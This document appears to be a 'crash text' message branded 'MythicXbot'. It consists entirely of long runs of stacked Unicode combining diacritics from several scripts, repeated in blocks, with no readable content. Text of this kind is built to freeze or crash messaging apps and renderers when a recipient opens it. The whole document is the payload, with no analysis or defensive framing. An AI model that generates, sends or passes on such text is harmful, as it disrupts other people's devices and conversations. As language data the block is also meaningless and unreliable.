๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*Myth
icXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*M
ythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*
MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫